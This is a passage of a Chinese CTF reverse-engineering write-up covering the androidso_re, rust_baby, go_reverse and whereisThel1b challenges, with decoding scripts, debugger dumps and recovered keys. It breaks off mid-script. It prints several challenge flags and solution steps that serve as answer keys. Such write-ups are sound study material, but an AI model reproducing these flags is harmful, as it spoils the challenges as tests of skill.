 0</span></span><br><span class="line"><span class="string">__const:0000000100003F63 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F64 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F65 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F66 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F67 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F68 C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F69 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F6A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6C C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F6D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F6E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F70 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F71 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F72 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F73 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F74 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F75 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F76 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F77 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F78 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F79 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F7A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F7D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F7E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F80 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F81 0F                            DCB  0xF</span></span><br><span class="line"><span class="string">__const:0000000100003F82 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F83 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F84 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F85 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F86 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F87 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F88 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F89 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F8A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8C 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F8D 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F8E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F90 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F91 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F92 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F93 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F94 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F95 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F96 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F97 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F98 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F99 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F9A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9C D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F9D 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F9E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA0 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003FA1 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003FA2 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA3 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA4 87                            DCB 0x87</span></span><br><span class="line"><span class="string">__const:0000000100003FA5 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003FA6 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA7 00                            DCB    0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分割数据</span></span><br><span class="line">lines = data.strip().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化结果列表</span></span><br><span class="line">result = []</span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">k = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    parts = line.split()</span><br><span class="line">    byte_data = parts[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    hex_data = <span class="built_in">int</span>(byte_data, <span class="number">16</span>)</span><br><span class="line">    a = <span class="built_in">hex</span>(hex_data)[<span class="number">2</span>:]</span><br><span class="line">    a = a.zfill(<span class="number">2</span>)</span><br><span class="line">    k = a+k</span><br><span class="line">    f+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> f==<span class="number">4</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line">        result.append(<span class="string">&quot;0x&quot;</span>+k)</span><br><span class="line">        k = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">    result[i] = <span class="built_in">int</span>(result[i],<span class="number">16</span>)</span><br><span class="line">    result[i]-=<span class="number">0x1e</span></span><br><span class="line">    result[i]^=<span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">    result[i]-=<span class="number">0x14</span></span><br><span class="line">    result[i]//=<span class="built_in">ord</span>(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">pl(result)</span><br><span class="line"><span class="comment">#flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;</span></span><br></pre></td></tr></table></figure><h2 id="androidso-re">androidso_re</h2><p>感谢Z神的帮助，不然凭借我垃圾的安卓能力，一定会被吊死的QAQ</p><p>之后做安卓题的时候</p><p>先用die查看存档记录：</p><p><img src="https://s2.loli.net/2024/05/31/onbZYyuX4JrI83f.png" alt="image-20240531202856657"></p><p>这个存档记录不知道什么意思，但是后面有写对应的安卓版本，如果使用dex编辑器可以看到mainactivity在classes3.dex中，</p><p><img src="https://s2.loli.net/2024/05/31/Tcp2D3Mtrmjgwxz.png" alt="image-20240531204001444"></p><p>这个表明要用安卓7来打开它QAQ</p><p>之前试过用安卓10来调试，结果百分百寄，痛苦，用ida调so也断不了，QAQ</p><p>于是可以顺利用安卓7打开来调试</p><p>jadx：</p><p><img src="https://s2.loli.net/2024/05/31/yP7mhFSEjxKeCiw.png" alt="image-20240531204430593"></p><p>直接拿到密钥和iv</p><p>直接解</p><p><img src="https://s2.loli.net/2024/05/31/CXcNs7Oa3H5bv8t.png" alt="image-20240531204507379"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">188</span>cba<span class="number">3</span>a<span class="number">5</span><span class="keyword">c</span><span class="number">0</span>fbb<span class="number">2250</span>b<span class="number">5</span>a<span class="number">2e590</span><span class="keyword">c</span><span class="number">391</span>ce&#125;</span><br></pre></td></tr></table></figure><h2 id="rust-baby">rust_baby</h2><p>打开文件</p><p>随便调一下，看到一个一大串连续的指令，应该就是加密‭‭‭<br>看到有一堆base64，解一下</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;henhenaaa!&quot;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">        <span class="string">&quot;cryforhelp&quot;</span>:<span class="string">&quot;igdydo19TVE13ogW1AT5DgjPzHwPDQle1X7kS8TzHK8S5KCu9mnJ0uCnAQ4aV3CSYUl6QycpibWSLmqm2y/GqW6PNJBZ/C2RZuu+DfQFCxvLGHT5goG8BNl1ji2XB3x9GMg9T8Clatc=&quot;</span>,</span><br><span class="line">        <span class="string">&quot;whatadoor&quot;</span>:<span class="string">&quot;1145141919810WTF&quot;</span>,</span><br><span class="line">        <span class="string">&quot;iwantovisit&quot;</span>:<span class="string">&quot;O0PSwantf1agnow1&quot;</span></span><br><span class="line">        &#125;&#123;</span><br><span class="line">    <span class="string">&quot;where&quot;</span>:<span class="string">&quot;where is your flag?:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;omg&quot;</span>:<span class="string">&quot;correct flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nonono&quot;</span>:<span class="string">&quot;nope, wrong flag&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;where&quot;</span><span class="punctuation">:</span><span class="string">&quot;where is your flag?:&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;omg&quot;</span><span class="punctuation">:</span><span class="string">&quot;correct flag&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nonono&quot;</span><span class="punctuation">:</span><span class="string">&quot;nope, wrong flag&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>由于一开始看到了isdebugpresent，所以尝试了附加调试，但是调试的时候发现程序会直接退出</p><p><img src="https://s2.loli.net/2024/05/31/arOtlpSWmDZGj8e.png" alt="image-20240531221756988"></p><p>是因为这个程序有多个线程，这个时候不是main线程，这时要先切换到main线程再继续调试。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11111111111</span></span><br><span class="line"><span class="number">00112233</span></span><br><span class="line">aaaaaaaaaaa</span><br><span class="line">``aabbcc</span><br><span class="line"></span><br><span class="line">-<span class="number">1</span> -<span class="number">1 0 0 1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><p>不写了，shi</p><p>QAQ</p><h2 id="go-reverse">go_reverse</h2><p>go逆向</p><p>看到函数表</p><p><img src="https://s2.loli.net/2024/06/04/e8whYgxBtiCNnkV.png" alt="image-20240604004730098"></p><p>在main开头的函数里找到了这个</p><p><img src="https://s2.loli.net/2024/06/04/JODUWdTupR6IwAk.png" alt=""></p><p>怀疑是aes cbc，经过分析，应该是</p><p>xor-tea-sm4-aes-base32</p><p>然后想了很久，硬是没发现flag是在哪里的，最后放弃，去找flag，发现那个题是环境题，题目只给了最后的secret</p><p>那么假定</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZR<span class="number">23</span>CZDIW<span class="number">3</span>Q<span class="number">73</span>KKTC<span class="number">3</span>UJKE<span class="symbol">NFAHFUFKOBNMM7</span>FCHXGGY<span class="number">3</span>BJY<span class="number">3</span>B<span class="number">4</span>FWQ<span class="number">4</span>DCI<span class="number">5</span>DQOEEM<span class="name">M5</span>I<span class="number">6</span><span class="meta">O5</span>AZRABU<span class="symbol">NXA7</span>CVWEDYKDOT<span class="number">4</span>JL<span class="attr">VSLE3</span>WFGXI=</span><br></pre></td></tr></table></figure><p>这个是我的secret，QAQ</p><p>解完base32后解AES，这里看到了两个值</p><p>dPGWgcLpqmxw3uOXhKpKV009Cql和Bs^8*wZ4lu8oR&amp;@k</p><p>第一个是密钥可以解密，第二个应该是iv</p><p>然后继续看sm4，传入了Bs^8*wZ4lu8oR&amp;@kpg5g#k6Qo3L&amp;1EzT</p><p>如果用流程图可以看到</p><p><img src="https://s2.loli.net/2024/06/05/ILDEUdgBoGJ7TrX.png" alt="image-20240605180853890"></p><p>这里说明了模式是CTR,逐步动调，分别可以看到一个128位值，一个16位值，和在自己写的flag下面两段相同的32位值，以及动调两步，在加密完后上面32位值下面添加了32位值</p><p>再动调，值没了</p><p><img src="https://s2.loli.net/2024/06/05/23r9mRsMofBz4Yh.png" alt="image-20240605182238963"></p><p>而下一步的输入</p><p><img src="https://s2.loli.net/2024/06/05/4JnEtmdslN1HWOj.png" alt="image-20240605182501943"></p><p>用这个可以猜aes的key和iv的值</p><p><img src="https://s2.loli.net/2024/06/05/8PnRoEYkI7XTZMr.png" alt="image-20240605183107505"></p><p>发现key和iv是一样的，同理，后面也不知道SM4是怎么加密的</p><hr><p>下面的调试步骤一共调了5次，可能数据对不上QAQ</p><p>观察输入和输出，已知key：pg5g#k6Qo3L&amp;1EzT</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Dump <span class="number">0xC00001E480</span> - <span class="number">0xC00001E4A0</span> (<span class="number">32</span> bytes) :</span><br><span class="line">[<span class="number">0xE1</span>, <span class="number">0x41</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x51</span>, <span class="number">0xA6</span>, <span class="number">0xCC</span>, <span class="number">0x83</span>, <span class="number">0x5F</span>, <span class="number">0x38</span>, <span class="number">0x43</span>, <span class="number">0xBD</span>, <span class="number">0x93</span>, <span class="number">0xCC</span>, <span class="number">0x37</span>, <span class="number">0x88</span>, <span class="number">0x94</span>, <span class="number">0xF5</span>, <span class="number">0x44</span>, <span class="number">0xDC</span>, <span class="number">0xAB</span>, <span class="number">0xC2</span>, <span class="number">0xCB</span>, <span class="number">0x92</span>, <span class="number">0x1D</span>, <span class="number">0xF2</span>, <span class="number">0x05</span>, <span class="number">0xA4</span>, <span class="number">0x26</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>]</span><br><span class="line"></span><br><span class="line">[+] Dump <span class="number">0xC00001A330</span> - <span class="number">0xC00001A360</span> (<span class="number">48</span> bytes) :</span><br><span class="line">[<span class="number">0xA8</span>, <span class="number">0x37</span>, <span class="number">0x7D</span>, <span class="number">0xE3</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x64</span>, <span class="number">0x7B</span>, <span class="number">0x7D</span>, <span class="number">0xAE</span>, <span class="number">0xEF</span>, <span class="number">0xEC</span>, <span class="number">0x0E</span>, <span class="number">0x53</span>, <span class="number">0x26</span>, <span class="number">0x1F</span>, <span class="number">0x74</span>, <span class="number">0xCA</span>, <span class="number">0x39</span>, <span class="number">0xD2</span>, <span class="number">0x73</span>, <span class="number">0x5A</span>, <span class="number">0xA6</span>, <span class="number">0x69</span>, <span class="number">0xEB</span>, <span class="number">0xF4</span>, <span class="number">0x7E</span>, <span class="number">0xF1</span>, <span class="number">0x56</span>, <span class="number">0x6B</span>, <span class="number">0x93</span>, <span class="number">0xEE</span>, <span class="number">0xCB</span>, <span class="number">0xA8</span>, <span class="number">0x3A</span>, <span class="number">0x73</span>, <span class="number">0x5C</span>, <span class="number">0x79</span>, <span class="number">0xEC</span>, <span class="number">0xAE</span>, <span class="number">0xD1</span>, <span class="number">0x05</span>, <span class="number">0x6D</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0x38</span>, <span class="number">0xEA</span>, <span class="number">0x47</span>]</span><br></pre></td></tr></table></figure><p>从32变成了48，sm4是块加密，一块为128位，16字节，输入正好是16的倍数，不应该增加位数，</p><p>再次调试，发现input是一样的，也就是说这里是先干了其它的然后才SM4</p><p>继续调试：可以推测128字节的值是s盒</p><p>在一个位置得到一个16长度的值s，值是</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0xF5</span>, <span class="number">0xEE</span>, <span class="number">0x67</span>, <span class="number">0xFD</span>, <span class="number">0xD9</span>, <span class="number">0x8D</span>, <span class="number">0xD2</span>, <span class="number">0xA2</span>, <span class="number">0xCB</span>, <span class="number">0xAC</span>, <span class="number">0x8A</span>, <span class="number">0x44</span>, <span class="number">0x90</span>, <span class="number">0x17</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>]</span><br></pre></td></tr></table></figure><p>下断点，发现它在加密中被读取了，并发现输入在后面被填充了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x71</span>, <span class="number">0xBF</span>, <span class="number">0xC2</span>, <span class="number">0x5A</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA0</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0xF3</span>, <span class="number">0x51</span>, <span class="number">0x07</span>, <span class="number">0x31</span>, <span class="number">0x3C</span>]</span><br></pre></td></tr></table></figure><p>然后s被添加了值变成了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x76</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x43</span>, <span class="number">0xEB</span>, <span class="number">0x59</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0xAE</span>, <span class="number">0xB1</span>, <span class="number">0xE0</span>, <span class="number">0x2C</span>, <span class="number">0xB3</span>, <span class="number">0x8C</span>, <span class="number">0x40</span>, <span class="number">0x44</span>, <span class="number">0x76</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x43</span>, <span class="number">0xEB</span>, <span class="number">0x59</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0xAE</span>, <span class="number">0xB1</span>, <span class="number">0xE0</span>, <span class="number">0x2C</span>, <span class="number">0xB3</span>, <span class="number">0x8C</span>, <span class="number">0x40</span>, <span class="number">0x64</span>]</span><br></pre></td></tr></table></figure><p>有32个，后面添加的值只有最后一位从44变成了64</p><p>输入在后面添加了值</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x16</span>, <span class="number">0xCB</span>, <span class="number">0xBF</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x17</span>, <span class="number">0x24</span>, <span class="number">0x77</span>, <span class="number">0x5C</span>, <span class="number">0xAB</span>, <span class="number">0x8F</span>, <span class="number">0xA1</span>, <span class="number">0x0D</span>, <span class="number">0x4E</span>]</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/06/05/omLaOgvq9ZEupWe.png" alt="image-20240605204649515"></p><p>rax保存了这个值，定位var28</p><p>重调：</p><p><img src="https://s2.loli.net/2024/06/05/8jrNsa1xUFbVPCM.png" alt="image-20240605212044032"></p><p>在输入末尾</p><p><img src="https://s2.loli.net/2024/06/05/icy1wO9dkbgUeGJ.png" alt="image-20240605212131738"></p><p>临近结束，这个状态还在，保存一下值</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input_ = [<span class="number">0xE1</span>, <span class="number">0x41</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x51</span>, <span class="number">0xA6</span>, <span class="number">0xCC</span>, <span class="number">0x83</span>, <span class="number">0x5F</span>, <span class="number">0x38</span>, <span class="number">0x43</span>, <span class="number">0xBD</span>, <span class="number">0x93</span>, <span class="number">0xCC</span>, <span class="number">0x37</span>, <span class="number">0x88</span>, <span class="number">0x94</span>, <span class="number">0xF5</span>, <span class="number">0x44</span>, <span class="number">0xDC</span>, <span class="number">0xAB</span>, <span class="number">0xC2</span>, <span class="number">0xCB</span>, <span class="number">0x92</span>, <span class="number">0x1D</span>, <span class="number">0xF2</span>, <span class="number">0x05</span>, <span class="number">0xA4</span>, <span class="number">0x26</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>, <span class="number">0x88</span>, <span class="number">0x8F</span>, <span class="number">0x9B</span>, <span class="number">0xCE</span>, <span class="number">0xD2</span>, <span class="number">0x3C</span>, <span class="number">0x34</span>, <span class="number">0x44</span>, <span class="number">0xE0</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x45</span>, <span class="number">0x68</span>, <span class="number">0x56</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0xC6</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x13</span>, <span class="number">0xF6</span>, <span class="number">0xC4</span>, <span class="number">0xF6</span>, <span class="number">0xFC</span>, <span class="number">0x15</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA5</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>]</span><br><span class="line">p = [<span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xB9</span>, <span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xD9</span>]</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/06/05/9eXj4CqIRWMgEdi.png" alt="image-20240605213108529"></p><p>这里保存了p的前16个值，然后p变成了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x88</span>, <span class="number">0</span>x8F, <span class="number">0</span>x9B, <span class="number">0</span>xCE, <span class="number">0</span>xD2, <span class="number">0</span>x3C, <span class="number">0</span>x34, <span class="number">0</span>x44, <span class="number">0</span>xE0, <span class="number">0</span>x4D, <span class="number">0</span>xC4, <span class="number">0</span>x45, <span class="number">0</span>x68, <span class="number">0</span>x56, <span class="number">0</span>x7A, <span class="number">0</span>x09, <span class="number">0</span>xC6, <span class="number">0</span>x70, <span class="number">0</span>x65, <span class="number">0</span>x34, <span class="number">0</span>x13, <span class="number">0</span>xF6, <span class="number">0</span>xC4, <span class="number">0</span>xF6, <span class="number">0</span>xFC, <span class="number">0</span>x15, <span class="number">0</span>x6E, <span class="number">0</span>x9C, <span class="number">0</span>xA5, <span class="number">0</span>x0F, <span class="number">0</span>x87, <span class="number">0</span>xCB</span><br></pre></td></tr></table></figure><p>即input加长后的32位，有理由</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">out</span> = [<span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xB9</span>, <span class="number">0x88</span>, <span class="number">0x8F</span>, <span class="number">0x9B</span>, <span class="number">0xCE</span>, <span class="number">0xD2</span>, <span class="number">0x3C</span>, <span class="number">0x34</span>, <span class="number">0x44</span>, <span class="number">0xE0</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x45</span>, <span class="number">0x68</span>, <span class="number">0x56</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0xC6</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x13</span>, <span class="number">0xF6</span>, <span class="number">0xC4</span>, <span class="number">0xF6</span>, <span class="number">0xFC</span>, <span class="number">0x15</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA5</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>]</span><br></pre></td></tr></table></figure><p>好好好，我理解了，看了一下CTR的定义，相当于其实是对计数器加密，然后和明文异或</p><p><img src="https://s2.loli.net/2024/06/05/LDPlI3E1UJsMxZK.png" alt="image-20240605225958990"></p><p>然后还是没有发现第三个部分，看了网上的wp才知道有第三段QAQ</p><p>得到了明文</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0xe1</span>,<span class="number">0</span>x41,<span class="number">0</span>xa7,<span class="number">0</span>xff,<span class="number">0</span>x25,<span class="number">0</span>x51,<span class="number">0</span>xa6,<span class="number">0</span>xcc,<span class="number">0</span>x83,<span class="number">0</span>x5f,<span class="number">0</span>x38,<span class="number">0</span>x43,<span class="number">0</span>xbd,<span class="number">0</span>x93,<span class="number">0</span>xcc,<span class="number">0</span>x37,<span class="number">0</span>x67,<span class="number">0</span>xd8,<span class="number">0</span>x8c,<span class="number">0</span>xbc,<span class="number">0</span>x24,<span class="number">0</span>x6e,<span class="number">0</span>x04,<span class="number">0</span>x8d,<span class="number">0</span>xcf,<span class="number">0</span>x79,<span class="number">0</span>xcb,<span class="number">0</span>x6e,<span class="number">0</span>xfe,<span class="number">0</span>xf4,<span class="number">0</span>x45,<span class="number">0</span>xe2,<span class="number">0</span>x12,<span class="number">0</span>xbf,<span class="number">0</span>x16,<span class="number">0</span>x3d,<span class="number">0</span>x3b,<span class="number">0</span>x4a,<span class="number">0</span>xf7,<span class="number">0</span>x77,<span class="number">0</span>x58,<span class="number">0</span>x6f,<span class="number">0</span>x66,<span class="number">0</span>xd4,<span class="number">0</span>xab,<span class="number">0</span>xab,<span class="number">0</span>xb5,<span class="number">0</span>x11,<span class="number">0</span>xd0,<span class="number">0</span>x28,<span class="number">0</span>x5e,<span class="number">0</span>xce,<span class="number">0</span>xcd,<span class="number">0</span>x95,<span class="number">0</span>x9a,<span class="number">0</span>x11,<span class="number">0</span>x9a,<span class="number">0</span>x62,<span class="number">0</span>x27,<span class="number">0</span>xd5,<span class="number">0</span>x71,<span class="number">0</span>x82,<span class="number">0</span>xbe,<span class="number">0</span>x9c</span><br></pre></td></tr></table></figure><p>然后解xxtea</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>啊啊啊啊啊啊啊啊啊啊啊啊啊啊，我谢谢你：)</p><p>解不出来放弃。QWQ</p><h2 id="whereisThel1b">whereisThel1b</h2><p>看佬的blog：</p><p>佬给了两个做法</p><p>硬分析：seed=0</p><p>秒</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">encry = [<span class="number">108</span>, <span class="number">117</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">115</span>, <span class="number">94</span>, <span 